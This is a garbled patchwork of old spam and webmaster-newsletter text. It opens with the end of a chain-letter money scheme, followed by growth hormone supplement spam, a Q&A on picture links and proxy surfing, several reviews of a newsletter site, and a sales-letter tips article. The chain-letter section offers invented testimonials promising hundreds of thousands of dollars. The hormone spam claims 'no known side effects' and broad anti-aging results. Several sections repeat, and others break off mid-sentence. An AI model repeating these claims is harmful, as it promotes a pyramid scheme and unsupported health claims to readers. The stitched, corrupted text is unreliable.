100,000 or more e-mails and your name will be on every one of them. 
Remember though, the more you send out the more potential customers 
you will reach. 
So my friend, I have given you the ideas, information, materials and 
opportunity to become financially independent. IT IS UP TO YOU NOW ! 

============ MORE TESTIMONIALS ================ 

"My name is Mitchell. My wife, Jody and I live in Chicago. I am an 
accountant with a major U.S. Corporation and I make pretty good money. 
When I received this program I grumbled to Jodyaboutreceiving ''junk 
mail''. I made fun of the whole thing,spoutingmy knowledge of the population 
and percentages involved. I ''knew'' it wouldn't work. Jody totally ignored 
my supposed intelligence and few days later she jumped in with both feet. I 
made merciless fun of her, and was ready to lay the old ''I told you so'' on 
her when the thing didn't work. Well, the laugh was on me! Within 3 weeks 
she had received 50 responses. Within the next 45 days she had received 
total $ 147,200.00 ........... all cash! I was shocked. I have joined Jody 
in her ''hobby''. 
Mitchell Wolf M.D., Chicago, Illinois 

====================================================== 

''Not being the gambling type, it took me several weeks to make up my 
mind to participate in this plan. But conservative that I am, I decided that 
the initial investment was so little that there was just no way that I 
wouldn't get enough orders to at least get my money back''. '' I was 
surprised when I found my medium size post office box crammed with 
orders. I made $319,210.00in the first 12 weeks. The nice thing about 
this deal is that it does not matter where people live. There simply isn't a 
better investment with a faster return and so big." 
Dan Sondstrom, Alberta, Canada 

======================================================= 

''I had received this program before. I deleted it, but later I wondered 
if I should have given it a try. Of course, I had no idea who to contact to 
get another copy, so I had to wait until I was e-mailed again by someone 
else.........11 months passed then it luckily came again...... I did not 
delete this one! I made more than $490,000 on my first try and all the 
money came within 22 weeks." 
Susan De Suza, New York, N.Y. 

======================================================= 

''It really is a great opportunity to make relatively easy money with 
little cost to you. I followed the simple instructions carefully and 
within 10 days the money started to come in. My first month I made 
$20,560.00 and by the end of third month my total cash count was 
$362,840.00. Life is beautiful, Thanx to internet.".

I took blood tests. Then I began using the GH1 as directed. <BR>
After 8 weeks I took blood tests again. <BR>
My IGF-1 level (evidence of GH) showed a 70% increase! <BR>
Furthermore, my cholesterol score went from 190 down to 144! <BR>
I definitely feel better overall and certainly have more energy. <BR>
To say the least I am very impressed and pleased with GH1. <BR>

-Susanne Peters, Laguna Beach, CA <BR>

were enhanced. My blood pressure is down to 126/84 after workout-and <BR>
it seems every other day I have to 'rev-up' the amps on the treadmill <BR>
at the gym. I've noticed a tightening of the skin under my chin and <BR>
a change in my lungs with much easier breathing. After 4 months, <BR>
I only need 5 hours sleep instead of 7. One morning, I had to do an extra =

<FONT size=3D3>
<FONT color=3D"#FF0000"><B>  <BR>
<BR>
Growth hormone is a naturally occurring substance in the human body which =
<BR>
is secreted by the pituitary, the master gland of the body, located in the=
 <BR>
endocrine system. GH is a microscopic protein substance that is chemically=
 <BR>
similar to insulin, which is secreted in short pulses during the first few=
 <BR>
hours of sleep and after exercise. GH is one of the most abundant hormones=
 <BR>
secreted, influencing growth of cells, bones, muscles and organs throughou=
t <BR>
the body. Production of GH peaks at adolescence. <BR>
<BR>
Every three years approximately 90% of the cells in the human body are new=
ly made. <BR>
The body is composed of more than 100 trillion cells that are continuously=
 <BR>
dying and regenerating. The brain and the nervous system retain their orig=
inal <BR>
cells; however, in the brain new proteins are continuously being produced =
to <BR>
store memories of every new experience. Overall intelligence and the abili=
ty <BR>
to learn and memorize all depend on adequate growth hormone. <BR>
<BR>
Growth hormone replacement therapy is now available to reverse age-related=
 symptoms, including wrinkling of the skin, increased body fat, decreased =
muscle mass, increased cholesterol, decreased stamina and energy, decrease=
d mental function and loss of libido. <BR>
When growth hormone falls below normal levels, supplementation offers the =
<BR>
all-natural potential for great benefit. Growth hormone is an amazing subs=
tance <BR>
which is safe and effective with no known side effects, if taken in the <B=
R>
proper dosage amounts. <BR>
<BR>
GH is one of many endocrine hormones, such as estrogen, progesterone, test=
osterone, <BR>
melatonin and DHEA, that all decline in production as we age. Hormones are=
 tiny <BR>
chemical messengers continuously secreted in the bloodstream in order to r=
egulate <BR>
the activities of the vital organs. The word "hormone" is derived from a G=
reek word <BR>

<BR>
Our bodies naturally produce GH in abundance when we are young, and its pr=

gradually slows over time. The amount of GH after the age of 21 falls abou=
t 14% per <BR>
decade, so that its production is reduced in half by age 60. While GH is n=
ot new, <BR>
its availability as a supplement has been limited. Specialized clinics and=
 physicians <BR>
have been using GH for over 30 years on thousands of patients with consist=
ent results. <BR>
Unfortunately, due to the high costs previously associated with GH, only t=
he medical <BR>
profession and the wealthy have been privy to its benefits. Another proble=
m has been <BR>
that the large GH molecule, composed of 191 amino acids (protein), had bee=

<b>QUESTIONS: </b><p>

From: moviebuff@cliffhanger.com <br>
Subject: Using pictures as links <p>

I'm changing my website and want to use pictures for the links to other pages. 
But, someone told me I should still put a 'click here' underneath all the 
pictures. To me, this removes all purpose of using the pictures.  <p>

How can I get across that you click on the pictures to get to other pages 
without coming right out and saying so? For example, I have a page with 
actor and actress information and just want to have a picture of my 
favorite stars to click on and change the picture every couple of days. <p>

Subject: Access using a proxy <p>

>From: CJ  (cj5000@post.com) <br>
>Subject: Unblocking sites so I can access? (Issue #422) <p>

--> I am currently living in a place where the ISP is 
blocking 50% of 
the web. I was told by someone that you can unblock these web sites by 
using a proxy, but I don't know what that means. I am wondering is 
there a way to get access to these sites? -- <br>
<p>
A proxy is easy to use if you use someone elses, they can be tricky to setup yourself. 
I have had very good results with Surfola. Basically you surf to their servers and then 
from there you surf Through/From their servers. I have several places I surf from that 
block content. Surfola easily bypasses them! Its also Free! You can also make money 
with them but I just use them to bypass anal retentive ISP/Corporate providers and 
because they allow me to surf anonymously! <p>

I have a detailed right-up on them at <a href="http://linkpaks.com/paidtosurf/Surfola.php"> http://linkpaks.com/paidtosurf/Surfola.php </a>
See there for more info. If anything is not clear feel free to ask.

CJ, <p>

Two such sites that allows proxy surfing are: <br>
http://www.anonymise.com and
http://www.anonymizer.com . <p>

However, if you cannot get to that site then obviously it will not work. 
Also note, that if your ISP is dictating to you which sites you may or 
may not visit, then it is time to change providers! <p>

I reviewed site 123 and found the size of the font to be too aggressive and 
I don't like mustard yellow for a background. Also in the second or third 
paragraph is a misspelled word which should be "first-come" not as 
shown on the page.<p>

I feel a sample of the type of information offered in the newsletter should 
be displayed on the page as well as a sample of the free ads offered 
on the site. I will probably submit a free ad just to see the content of the newsletter.  <p>

As has been mentioned many times, some information about the person 
doing the page is always good.  We need some information about 
why this newsletter will be worthwhile to subscribe to. <br>
~~~~<p>

Dennis - I took a look at your site, and have recommendations 
for improving your page.<br>
1- I use Internet Explorer and view web pages with my text size set to 
'smaller'. The text you used was quite large, like a font used for a heading 
for all the text. By making the text size smaller it wouldn't feel like 
you were screaming at me. Also, the background was just too much.<br>
2- There were spelling errors in the text. Often it might be difficult for you 
to spot these yourself if you see the page all the time, but have a friend 
look it over. Spelling errors make the page look unprofessional.<br>
3- Offer a sample of your newsletter so people can see what it looks like 
before they subscribe. Also, if you are asking for a person to give you 
their email address, you MUST have a privacy policy and let them know 
they can unsubscribe.<br>
4- Think about adding a form for people to subscribe to the newsletter. 
It looks more professional than just offering an email address to send to.<br>
5- Offer information about yourself, and the kinds of information your 
newsletter contains. Maybe extend your site to include back issues or 
an archive to see what information you have offered in the past.<br>
6- Build another page for 'sponsoring info' and put prices on that 
page. Remove all pricing information from the home page.<br>
~~~~<p>

I feel that the background is a little too bold and busy for the text. 
I also believe that the text is too large which makes it difficult to read 
quickly, and forces the reader to scroll down unnecessarily. 
I noticed some spelling errors, and I think that a link to the classifieds 
site should be provided, and online payments should be accepted. 
A site that sells advertising should have advertisments on it!<br>
~~~~<p>

This is a very clear site with nothing interfering with the 
message.  I did not like the background colour, however that is 
personal, it did not detract from the information.  I was tempted 
to sign up for the newsletter but would have liked a link to see 
a current issue. There was an error in the wording (a word 
missed) which needs correction and I think the fonts could be 
smaller. Overall a non-confusing site which makes a nice change. *cheers*<br>

~~~~<p>

Could use a better background and the fonts are very large, there also 
are errors in the following paragraphs : 
"first com-first serve" and "to place a sponsor advertisement, 
send your to my email"<br>
~~~~<p>

A single page site. It is necessary to subscribe to the webmaster's 
newsletter to see what he's doing, and it doesn't seem to me to be 
a way to get people to visit. I wouldn't, for example. He claims to 
have lots of tidbits of information that, he says, we probably 
didn't know, and this is possible, but in my opinion, he would be 
better served if he at least put some of the things out there for 
all to see - when the appetite, so to speak, if he want people to 
subscribe. As it is, I would not bother.<br>
~~~~<p>

What does one expect from a site like netsbestinfo? Some useful 
resources and some useful tips and also some forms of easy 
advertisement on the net. But what we get here is a newsletter 
with the owner (whose email reads damorgarjr@yahoo.com) 
asking us to subscribe us to his newsletter for a free 4-line ad. 
He also tells of paid category of advertisements. This is all we get 
from a site which has a grand title. Even the information about 
the newsletter is hardly impressive and is presented in about 35-to-40 
points size which gets difficult to read. <br>
~~~~<p>

A neat enough site but the background could be a little hard on 
the eyes. There is only really one problem with this page - its 
just an advertisement for a newsletter. No, scratch that, its an 
advertisement to place free ads in a newsletter. A bold enough 
move perhaps but I learned hardly anything about the newsletter 
itself and immediately started worrying about getting a flood of 
ads to my email account so I didn't even subscribe. Presumably 
you'd want to get people to sign up so might I suggest splitting 
the page into the newsletter itself, perhaps a sample issue, 
a privacy policy and a promise not to drown in ads and then click 
for more info on your free ads. <p>

<b>QUESTIONS: </b><p>

From: moviebuff@cliffhanger.com <br>
Subject: Using pictures as links <p>

I'm changing my website and want to use pictures for the links to other pages. 
But, someone told me I should still put a 'click here' underneath all the 
pictures. To me, this removes all purpose of using the pictures.  <p>

How can I get across that you click on the pictures to get to other pages 
without coming right out and saying so? For example, I have a page with 
actor and actress information and just want to have a picture of my 
favorite stars to click on and change the picture every couple of days. <p>

Subject: Access using a proxy <p>

>From: CJ  (cj5000@post.com) <br>
>Subject: Unblocking sites so I can access? (Issue #422) <p>

--> I am currently living in a place where the ISP is 
blocking 50% of 
the web. I was told by someone that you can unblock these web sites by 
using a proxy, but I don't know what that means. I am wondering is 
there a way to get access to these sites? -- <br>
<p>
A proxy is easy to use if you use someone elses, they can be tricky to setup yourself. 
I have had very good results with Surfola. Basically you surf to their servers and then 
from there you surf Through/From their servers. I have several places I surf from that 
block content. Surfola easily bypasses them! Its also Free! You can also make money 
with them but I just use them to bypass anal retentive ISP/Corporate providers and 
because they allow me to surf anonymously! <p>

I have a detailed right-up on them at <a href="http://linkpaks.com/paidtosurf/Surfola.php"> http://linkpaks.com/paidtosurf/Surfola.php </a>
See there for more info. If anything is not clear feel free to ask.

>From: CJ  (cj5000@post.com) <br>
>Subject: Unblocking sites so I can access? (Issue #422) <p>

CJ, <p>

Two such sites that allows proxy surfing are: <br>
http://www.anonymise.com and
http://www.anonymizer.com . <p>

However, if you cannot get to that site then obviously it will not work. 
Also note, that if your ISP is dictating to you which sites you may or 
may not visit, then it is time to change providers! <p>

points size which gets difficult to read. <br>
~~~~<p>

A neat enough site but the background could be a little hard on 
the eyes. There is only really one problem with this page - its 
just an advertisement for a newsletter. No, scratch that, its an 
advertisement to place free ads in a newsletter. A bold enough 
move perhaps but I learned hardly anything about the newsletter 
itself and immediately started worrying about getting a flood of 
ads to my email account so I didn't even subscribe. Presumably 
you'd want to get people to sign up so might I suggest splitting 
the page into the newsletter itself, perhaps a sample issue, 
a privacy policy and a promise not to drown in ads and then click 
for more info on your free ads. <p>

32 Easy Ways To Breath New Life Into Any Webpage
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; It's true.
<p>Ask the CEOs of Yahoo.com and America Online.&nbsp; They'll
<br>tell you it's true.&nbsp; Send an email to Terry Dean or Allen
<br>Says or Jim Daniels and ask them about it.&nbsp; They'll agree
<br>100% that it's true.&nbsp; Don't just take my word for it.
<p>In fact, you can contact any of the 10,000 folks online
<br>selling web marketing resources, and they will all tell you
<br>emphatically, without question, no doubts whatsoever, that
<br>it is absolutely true.
<p>It's true. ANYONE can earn a living online.&nbsp; Really, they
<br>can.&nbsp; But, it takes several very important components to
<br>join the 5% who are successful on the web.
<p>&nbsp;&nbsp;&nbsp;&nbsp; One of those necessities is a website.
<p>&nbsp;&nbsp;&nbsp;&nbsp; Now, your website does one of two things...
<p>&nbsp;&nbsp;&nbsp;&nbsp; ...it either makes the sale, or it doesn't.
<p>For 95% of online businesses, their websites simply do
<br>not produce results.
<p>And there is a very simple reason for poor performance.
<br>Poor sales letters.
<p>Does your website convince people to make a purchase?
<br>If not, here are 32 easy ways to breathe new life into
<br>your sales letter...
<p>1) Write your sales letter with an individual in mind.
<br>Go ahead and pick out someone, a real person to write your
<br>sales letter to.&nbsp; Doesn't matter if it is grandma or your
<br>next door neighbor or your cat.&nbsp; Write your sales letter
<br>just like you are writing it to them personally.&nbsp; Why?
<br>Because when your potential customer reads, it then it will
<br>seem personal, almost like you wrote it with them in mind.
<br>Too often, sales letters are written as if they were going
<br>to be read to an audience rather than one person.&nbsp; Keep your
<br>sales letters personal, because one person at a time is
<br>going to read them.
<p>2) Use an illustration to get your point across.&nbsp; In my
<br>sales letters I have told stories about my car stalling on
<br>the side of the road to illustrate the idea that we must
<br>constantly add the fuel of advertising to keep our
<br>businesses running. I have compared the hype of easily
<br>making millions online to the chances of me riding bareback
<br>across Montana on a grizzly bear.&nbsp; Leads have read of how
<br>getting to the top of an oak tree relates to aggressively
<br>marketing online. People love a good story that pounds home
<br>a solid message.&nbsp; Tell stories that illustrate a point you
<br>are trying to make.&nbsp; Emphasize a benefit by sharing an
<br>account from the "real world."&nbsp; It effectively creates
<br>interest and further establishes the point.
<p>3) Create an interest in the reader from the very first
<br>line.&nbsp; Your first line of the sales letter should
<br>immediately create a desire in the reader to want to know
<br>more.&nbsp; Go back to the beginning of this article.&nbsp; The first
<br>words were, "It's true."&nbsp; I can guarantee you that either
<br>consciously or subconsciously you thought "What's true?"
<br>Immediately, your mind wanted to know what I was talking
<br>about.&nbsp; Before you even knew it you were right here, 8
<br>paragraphs into this article.&nbsp; Carefully craft your first
<br>line.&nbsp; If you can immediately get them wanting to know more,
<br>you've got a winner.
<p>4) Use bullets. People spend a lot of time reading bulleted
<br>lists. In fact, they often reread them over and over. Use
<br>bulleted lists to stress the benefits of your product or
<br>service, to spell out exactly what is included in your offer.
<br>Use an extra space in between each bullet to really highlight
<br>each line and create a sense of more length to the list.
<p>5) Launch into a bullet list immediately.&nbsp; Shortly after
<br>your opening line, immediately give the reader a bullet
<br>list of benefits to absorb.&nbsp; Hit them with your best shot.
<br>Pull out the big guns and stress "just a few of" the most
<br>important things the reader will discover.&nbsp; By offering a
<br>killer list early in your sales letter, you will automatically
<br>create a desire in the reader to continue through your ad
<br>copy.&nbsp; After all, if they are already interested after the
<br>first list of benefits, they will certainly be open to
<br>finding out even more reasons why your product or service
<br>will aid them.
<p>6) Just let it all flow out.&nbsp; Write down everything that
<br>enters your mind as you are writing your sales letter. You
<br>can edit it later.&nbsp; If you just sit and start writing
<br>everything you know about your product or service and how it
<br>will benefit your customer, you will be amazed at how much
<br>information floods your mind.&nbsp; Write it ALL down.&nbsp; Then read
<br>through it - you'll be able to add a lot more detail to
<br>many of the points.&nbsp; Edit it after you have exhausted all
<br>of your ideas.
<p>7) Make your sales letter personal.&nbsp; Make sure that the
<br>words "you" and "your" are at least 4:1 over "I" and "my."
<br>Your ad copy must be written about YOUR CUSTOMER not
<br>yourself.&nbsp; I'm not sure how the old advertising adage goes,
<br>but it's something like this, "I don't care a thing about
<br>your lawn mower, I just care about my lawn."&nbsp; Leads aren't
<br>interested in you or your products, they are interested in
<br>themselves and their wants and needs.&nbsp; When you are finished
<br>with your sales letter and have uploaded it to a test
<br>webpage, run a check at http://www.keywordcount.com and see
<br>what the ratio between "you" and "your" versus references to
<br>"I," "me," "my," etc.&nbsp; It's a free service.&nbsp; Make sure it's
<br>at least 4:1 in favor of the customer.
<p>8) Write like you speak.&nbsp; Forget all of those rules that
<br>your grammar teacher taught you.&nbsp; Write your sales letters
<br>in everyday language, just like you would talk in person.
<br>Don't be afraid to begin sentences with "And" or "Because."
<br>Don't worry about ending a sentence with a preposition.
<br>Write like you speak. Your sales letter isn't the great
<br>American novel, so don't write it like you are Ernest
<br>Hemingway.
<p>9) Use short paragraphs consisting of 2-4 sentences each.
<br>Long copy works... but long paragraphs do not.&nbsp; Use short
<br>paragraphs that lead into the next paragraph. Don't be
<br>afraid to use short sentences.&nbsp; Like this one.
<p>Or this.
<p>See what I mean?&nbsp; Shorter paragraphs keep the interest of
<br>the reader. Longer paragraphs cause eye strain and often
<br>force the reader to get distracted.
<p>10)&nbsp; Stress the benefits, not the features.&nbsp; Again,
<br>readers want the burning question answered, "What's in it
<br>for&nbsp; me?"&nbsp; What need is it going to meet? What want is it
<br>going to fill?&nbsp; How is your product or service going to be
<br>of value or benefit to the reader?&nbsp; Spell it out.&nbsp; Don't
<br>focus on the features of your product or service , but
<br>rather how those features will add value to the life of your
<br>reader.
<p>For example:&nbsp; If you are selling automobile tires, you may
<br>very well have the largest assortment of tires in the world,
<br>but who cares? I don't care about your selection. But, I
<br>do care about keeping my 3-month-old baby girl safe while
<br>we are traveling.&nbsp; So, instead of focusing on your selection,
<br>you focus on the fact that my baby girl can be kept safe
<br>because you have a tire that will fit my car. You're not
<br>selling tires, you're selling safety for my family. Stress
<br>the benefits, not the features.
<p>11) Keep the reader interested.&nbsp; Some sales letters read
<br>like they are a manual trying to explain to me how I can
<br>perform some complicated surgery on my wife. They are
<br>filled with words and phrases that I need a dictionary to
<br>understand.&nbsp; Unless you are writing to a very targeted
<br>audience, avoid using technical language that many readers
<br>might not understand. Keep it simple, using words, language
<br>and information that are easy to understand and follow.
<p>12) Target your sales letter.&nbsp; When you are finished with
<br>your final draft of the sales letter, target it to a
<br>specific audience.&nbsp; For example: If you are selling a "work
<br>at home" product, then rewrite the sales letter by adding
<br>words in the headlines and ad copy that are targeted towards
<br>women who are homemakers.&nbsp; Then, rewrite the same sales
<br>letter and target it to college students.&nbsp; Write another
<br>letter targeting senior citizens.&nbsp; Still another could be
<br>written to high school teachers wanting to earn extra income
<br>during summer vacation.&nbsp; The possibilities are endless.
<p>All you need to do is add a few words here and there in
<br>your ad copy to make it appear that your product or service
<br>is specifically designed for a target audience. "Work only
<br>5 hours a week," would become "College Students, work only
<br>5 hours a week."&nbsp; Your sales letter is now targeted. Upload
<br>all of the sales letters to separate pages on your website
<br>(you could easily target 100's of groups).
<p>Then, simply advertise the targeted pages in targeted
<br>mediums.&nbsp; You could advertise the "College Students" page
<br>in a campus ezine.&nbsp; The "Senior Citizens" page could be
<br>advertised at a retirement community message board.
<p>By creating these targeted sales letters, you can literally
<br>open up dozens of new groups to sell your existing product
<br>to.&nbsp; And, in their eyes, it looks like the product was a
<br>match made for them.
<p>13) Make your ad copy easy to follow.&nbsp; Use short sentences
<br>and paragraphs. Break up the sales letter with attention
<br>grabbing headlines that lead into the next paragraph. One
<br>thing that I have always found to work very well in sales
<br>letters...
<p>&nbsp;&nbsp;&nbsp;&nbsp; ...is to use a pause like this.
<p>Start the sentence on one line, leaving the reader wanting
<br>to know more, and then finishing up on the next line. Also,
<br>if you are going to use a sales letter that continues on
<br>several different pages of your website, use a catchy hook
<br>line at the end of each page to keep them clicking. "Let's
<br>get you started down the road to success, shall we? CLICK
<br>HERE to continue."
<p>14) Use similes and metaphors for effect.&nbsp; When the
<br>customer purchases your product, they will generate "a flood
<br>of traffic that would make Noah start building another ark."
<br>If they do not order today, then they will "feel like a cat
<br>that let the mouse get away."&nbsp; Use words to create a picture
<br>in the readers' mind.&nbsp; When you think of Superman, what
<br>comes to mind?&nbsp; Immediately, we remember that he is "faster
<br>than a speeding bullet."&nbsp; "More powerful than a locomotive."
<br>"Able to leap tall buildings in a single bound." See how
<br>word pictures stick in our minds?
<p>15) Focus on one product or service.&nbsp; Don't try to sell
<br>your customer multiple products at the same time. It only
<br>confuses the reader.&nbsp; Keep your ad copy directed at one
<br>specific product or service.&nbsp; Then, use other products and
<br>services as back-end products.
<p>16) Make it stand out.&nbsp; Don't kid yourself.&nbsp; There are
<br>hundreds, maybe thousands out there on the web doing the
<br>same thing you are doing.&nbsp; How will you stand out among the
<br>crowd?&nbsp; Your sales letter must inject personality. It must
<br>breathe of originality.&nbsp; Your product or service is
<br>different. It's not like all of the rest.&nbsp; It is unique.
<br>Right? Your sales letter must separate you from the
<br>competition.&nbsp; It must create a feeling of "You won't find
<br>this anywhere else."
<p>17) Be believable. "Earn $54,000 in the next 24 hours!!!"
<br>Delete.&nbsp; Good grief, do they think I am an idiot or
<br>something?&nbsp; Get real.&nbsp; Don't make outrageous claims that
<br>are obviously not the truth.&nbsp; You'll ruin your reputation.
<br>Let me tell you a simple universal fact that cannot be
<br>reversed.&nbsp; Once you have been branded a liar, you will
<br>NEVER be anything but a liar.&nbsp; It doesn't matter if you
<br>launch the most respectable, honest business available
<br>anywhere, people will always have doubt because they
<br>remember the crazy stuff you've said before.&nbsp; Be believable.
<br>Don't exaggerate, mislead, stretch or distort the truth.
<p>18) Be specific. Don't generalize your information, but
<br>rather be EXACT.&nbsp; Instead of "over 100 tips for losing
<br>weight" use "124 tips for losing weight." By generalizing
<br>information, it creates doubt and questions in the reader's
<br>mind.&nbsp; "What am I really getting here?&nbsp; Does he even know?"
<br>When you use specific information, the reader begins to
<br>think, "This person must have counted.&nbsp; I know exactly what
<br>I can expect."&nbsp; "Platitudes and generalities roll off the
<br>human understanding like water from a duck," wrote Claude
<br>Hopkins in his classic book "Scientific Advertising." "They
<br>leave no impression whatsoever."
<p>19) Be complete. Tell the reader everything they would
<br>want to know about your product or service.&nbsp; Answer all of
<br>their questions, anything they would want to consider before
<br>making a purchase.&nbsp; Think about it from their point of view.
<br>Ask yourself, "Why wouldn't I buy this?"&nbsp; Then, address that
<br>in your sales letter.&nbsp; Remove anything that would keep the
<br>reader from making the purchase.
<p>20) Use testimonials to boost your sales.&nbsp; Share actual
<br>excerpts from what your current customers are saying about
<br>your product or service. Many websites have an entire
<br>section or even a separate page that has endorsements and
<br>compliments listed.&nbsp; Satisfied customers remove some of the
<br>doubt in the mind of the reader.&nbsp; "If these people have
<br>found a lot of value and benefit in the product, then I
<br>probably will too."&nbsp; Especially effective are testimonials
<br>from respected, well known "authorities" within your target
<br>field.
<p>21) Use headlines over and over throughout the sales letter.
<br>A headline isn't just relegated to the beginning of your
<br>ad copy.&nbsp; Use them frequently -but don't overuse.&nbsp; A well-
<br>placed headline re-grabs the reader's attention, brings
<br>them deeper into the letter, and readies them for the next
<br>paragraph. You will want to spend as much time working on
<br>your headlines as you do the entire sales letter.&nbsp; They are
<br>that important.
<p>22) Avoid asking stupid questions.&nbsp; "Wouldn't you like to
<br>make $1,000,000 a year?" "Doesn't that sound great?" "Would
<br>you like to be as successful as I am?"&nbsp; Avoid any question
<br>that insults the intelligence of your reader or makes them
<br>feel like they are inferior.
<p>23) Offer a freebie even if the customer doesn't buy.
<br>If the customer decides he or she isn't going to make a
<br>purchase, then you want to follow-up with them later to try
<br>to influence them to buy in the future.&nbsp; By offering a free
<br>item, you can&nbsp; request their email address in order to
<br>obtain the freebie.&nbsp; By doing this, you can now follow-up
<br>with the customer for a potential future sale.
<br>Additionally, you can continue the sales process by having
<br>your ad copy, banners, flyers, etc. within the free item.
<br>And, of course, if your free item is a high quality, useful
<br>product or service which impresses the customer, they
<br>probably will be back as a customer soon.
<p>24) Use bonuses to overwhelm the reader.&nbsp; One of the things
<br>that I have found very effective in writing sales letters
<br>is to include bonus items that OUT-VALUE the actual product
<br>I am offering.&nbsp; Ginsu made this one famous. They were
<br>selling a set of steak knives, but before the commercial
<br>was finished, you had so many bonus items on the table
<br>it was hard to refuse. Make sure you provide quality
<br>bonuses and not some worthless, outdated junk that damages
<br>the credibility of your main offer.
<p>25) Use connective phrases like "But wait, there's more"
<br>and "But that's not all."&nbsp; These phrases effectively lead
<br>the reader from one paragraph to the next, particularly
<br>when the next paragraph is a bullet list of benefits, or
<br>leads into bonus items.&nbsp; Again, the idea is MORE and MORE
<br>value and benefits to the reader.
<p>26) Always include a deadline.&nbsp; By including a deadline,
<br>you create a sense of urgency in the mind of the customer.
<br>"If I don't order within 24 hours, then I won't get the
<br>bonuses."&nbsp; "Oh no, there are only 10 items remaining,
<br>I've got to hurry."&nbsp; Let the customer know what they will
<br>be missing out on if they don't make the deadline. Remember,
<br>they won't miss out on your products or bonuses, they will
<br>miss out on all of the benefits of your products. Deadlines
<br>are very effective.&nbsp; Every sales letter should have one.
<p>27) Tell them exactly how to order.&nbsp; Be clear as to the
<br>order process. Point them towards the order link.&nbsp; Tell
<br>them what methods you offer. (I.E. credit cards, checks,
<br>etc.)&nbsp; Make this process as simple and clear as can be.
<br>If it takes more than 2 steps, most people won't continue.
<p>28)&nbsp; Explain when the product will be delivered.&nbsp; How
<br>quickly will the order be processed?&nbsp; When will the order be
<br>available?&nbsp; Let the customer know exactly what they can
<br>expect when they place their order.&nbsp; The more specific you
<br>can be here, the better.&nbsp; Let them know that you have a
<br>system in place.&nbsp; "Operators are standing by."&nbsp; Their order
<br>will be handled properly.&nbsp; Tell them.
<p>29) Offer a money back guarantee.&nbsp; Take away their last
<br>reason to hold back.&nbsp; Offer a "no questions asked" 30 day
<br>guarantee.&nbsp; Most people may not realize this, but in most
<br>cases, it's the law of the land.&nbsp; You are REQUIRED to give
<br>them their money back if they are not satisfied with the
<br>product or service.&nbsp; Since it's the law anyway, why not make
<br>it a benefit. Let them know that they are purchasing your
<br>product or service RISK-FREE.
<p>30) Instruct them to respond immediately.&nbsp; Many people
<br>just need to read those words, "Act Now!"&nbsp; "Order today!"
<br>"Click Here to Instantly Place Your Order."&nbsp; You've got them
<br>this far, now tell them what you want them to do.&nbsp; Get them
<br>to "Act Fast!"&nbsp; Have you ever heard a mail order commercial
<br>on television that didn't prompt the viewer to order right
<br>way?
<p>31) Include a post script.&nbsp; People will always read the
<br>P.S.&nbsp; Always. In fact, the P.S. is one of the MOST IMPORTANT
<br>parts of your sales letter. Why?&nbsp; Because in many cases the
<br>visitor at your website will scroll immediately down to the
<br>end of your page to see how much it is going to cost.&nbsp; A
<br>P.S. is a perfect place to recap your offer, so when they
<br>see your price tag, they will also see a very detailed
<br>description of what they will receive for their money. Use
<br>your P.S. to restate your offer in detail.
<p>32) Include a second post script.&nbsp; You better believe
<br>if they read the first P.S., they will read a P.P.S.&nbsp; Use
<br>this post script to remind them of the deadline or offer
<br>another bonus or point out some compelling factor that would
<br>make them want to order.&nbsp; I guarantee you they will read it.
<p>Use these 32 tips and I guarantee you that you will see
<br>a significant increase in the amount of responses you
<br>receive from your sales letters.&nbsp; In fact, it would be
<br>impossible for your responses to not improve.

<p>Ask the CEOs of Yahoo.com and America Online.&nbsp; They'll
<br>tell you it's true.&nbsp; Send an email to Terry Dean or Allen
<br>Says or Jim Daniels and ask them about it.&nbsp; They'll agree
<br>100% that it's true.&nbsp; Don't just take my word for it.
<p>In fact, you can contact any of the 10,000 folks online
<br>selling web marketing resources, and they will all tell you
<br>emphatically, without question, no doubts whatsoever, that
<br>it is absolutely true.
<p>It's true. ANYONE can earn a living online.&nbsp; Really, they
<br>can.&nbsp; But, it takes several very important components to
<br>join the 5% who are successful on the web.
<p>&nbsp;&nbsp;&nbsp;&nbsp; One of those necessities is a website.
<p>&nbsp;&nbsp;&nbsp;&nbsp; Now, your website does one of two things...
<p>&nbsp;&nbsp;&nbsp;&nbsp; ...it either makes the sale, or it doesn't.
<p>For 95% of online businesses, their websites simply do
<br>not produce results.
<p>And there is a very simple reason for poor performance.
<br>Poor sales letters.
<p>Does your website convince people to make a purchase?
<br>If not, here are 32 easy ways to breathe new life into
<br>your sales letter...
<p>1) Write your sales letter with an individual in mind.
<br>Go ahead and pick out someone, a real person to write your
<br>sales letter to.&nbsp; Doesn't matter if it is grandma or your
<br>next door neighbor or your cat.&nbsp; Write your sales letter
<br>just like you are writing it to them personally.&nbsp; Why?
<br>Because when your potential customer reads, it then it will
<br>seem personal, almost like you wrote it with them in mind.
<br>Too often, sales letters are written as if they were going
<br>to be read to an audience rather than one person.&nbsp; Keep your
<br>sales letters personal, because one person at a time is
<br>going to read them.
<p>2) Use an illustration to get your point across.&nbsp; In my
<br>sales letters I have told stories about my car stalling on
<br>the side of the road to illustrate the idea that we must
<br>constantly add the fuel of advertising to keep our
<br>businesses running. I have compared the hype of easily
<br>making millions online to the chances of me riding bareback
<br>across Montana on a grizzly bear.&nbsp; Leads have read of how
<br>getting to the top of an oak tree relates to aggressively
<br>marketing online. People love a good story that pounds home
<br>a solid message.&nbsp; Tell stories that illustrate a point you
<br>are trying to make.&nbsp; Emphasize a benefit by sharing an
<br>account from the "real world."&nbsp; It effectively creates
<br>interest and further establishes the point.
<p>3) Create an interest in the reader from the very first
<br>line.&nbsp; Your first line of the sales letter should
<br>immediately create a desire in the reader to want to know
<br>more.&nbsp; Go back to the beginning of this article.&nbsp; The first
<br>words were, "It's true."&nbsp; I can guarantee you that either
<br>consciously or subconsciously you thought "What's true?"
<br>Immediately, your mind wanted to know what I was talking
<br>about.&nbsp; Before you even knew it you were right here, 8
<br>paragraphs into this article.&nbsp; Carefully craft your first
<br>line.&nbsp; If you can immediately get them wanting to know more,
<br>you've got a winner.
<p>4) Use bullets. People spend a lot of time reading bulleted
<br>lists. In fact, they often reread them over and over. Use
<br>bulleted lists to stress the benefits of your product or
<br>service, to spell out exactly what is included in your offer.
<br>Use an extra space in between each bullet to really highlight
<br>each line and create a sense of more length to the list.
<p>5) Launch into a bullet list immediately.&nbsp; Shortly after
<br>your opening line, immediately give the reader a bullet
<br>list of benefits to absorb.&nbsp; Hit them with your best shot.
<br>Pull out the big guns and stress "just a few of" the most
<br>important things the reader will discover.&nbsp; By offering a
<br>killer list early in your sales letter, you will automatically
